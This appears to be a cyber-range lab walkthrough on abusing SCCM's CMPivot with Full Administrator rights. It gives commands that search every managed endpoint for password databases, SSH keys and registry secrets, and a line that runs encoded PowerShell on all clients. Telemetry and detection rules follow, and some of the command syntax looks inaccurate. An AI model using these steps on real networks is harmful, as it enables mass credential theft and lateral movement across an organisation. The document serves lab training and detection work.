# WT#037 — SCCM CMPivot Abuse

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr02 (192.168.77.23) |
| **Domain** | range.local |
| **Starting Credential** | SCCM Full Administrator privileges on mbr02 |
| **Tools Required** | SharpSCCM, CMPivot built-in tool |
| **Certifications** | WKL (WasteHelloKitty — OADOC) |
| **MITRE ATT&CK** | T1046 (Network Service Discovery), T1082 (System Information Discovery) |
| **Difficulty** | Medium |

## Prerequisites
- SCCM Full Administrator role — `RANGE\svc_sccm` has Full Admin rights (verified by `10-sccm-verify.yml`)
- SCCM site server (CAD) running on mbr02
- CMPivot accessible via Configuration Manager console on mbr02

## Attack Steps

### 1. Launch CMPivot via SCCM console

```powershell
# Open SCCM console → Monitoring → CMPivot
# Select target collection (e.g., "All Systems")
```

### 2. Data collection queries

```powershell
# Query installed software across all endpoints
CMPivot> Software
CMPivot> Services
CMPivot> Process
CMPivot> Registry
CMPivot> File
CMPivot> EventLog
```

### 3. Execute queries with SharpSCCM (programmatic)

```powershell
# From attacker-controlled endpoint with SCCM admin
SharpSCCM.exe cmpivot -s sccm-range.range.local -q "Registry | where Path == 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'"
```

### 4. Collect credentials via CMPivot

```powershell
# Search for credential files across all managed endpoints
CMPivot> File | where Name like '%.kdb'
CMPivot> File | where Name like '%.ppk'
CMPivot> Registry | where Path like '%password%'
CMPivot> EventLog Security | where EventID == 4648
```

### 5. Execute script via CMPivot

```powershell
# CMPivot can invoke scripts on remote clients (with proper permissions)
CMPivot> Invoke-Script "powershell.exe -enc <BASE64>"
```

## Post-Exploitation Chain
```
SCCM Full Admin Access
  └──> CMPivot Abuse (WT#037)
       ├──> Mass data collection from ALL managed endpoints
       │    ├──> Installed software inventory
       │    ├──> Running processes
       │    ├──> Registry values (passwords, secrets)
       │    └──> File system search (credentials, keys)
       └──> Remote script execution on all clients
            └──> Full lateral movement across organization
```

## Telemetry Verification
**On SCCM site server:**
- **CMPivot.log**: `C:\Program Files\Microsoft Configuration Manager\Logs\CMPivot.log`
- **SMSAdminUI.log**: CMPivot launch events
- **Event ID 4663** (SMS Provider access for CMPivot queries)

**On managed endpoints:**
- **Event ID 4688** (Process creation from CMPivot script execution)
- **CCMNotificationAgent.log**: CMPivot polling activity
- Network connections to SCCM MP (Management Point) on HTTPS/443

**Detection Rules:**
- CMPivot queries from non-administrative accounts
- High volume of WMI queries (`root\CCM\Invariants`) across multiple endpoints
- SharpSCCM.exe `cmpivot` command execution
- CMPivot `Invoke-Script` usage for command-line execution

## Status
**CONFIGURED** — SCCM site server running on mbr02. `RANGE\svc_sccm` has SCCM Full Administrator rights. Requires SCCM Console access on mbr02 to launch CMPivot queries against all managed clients.
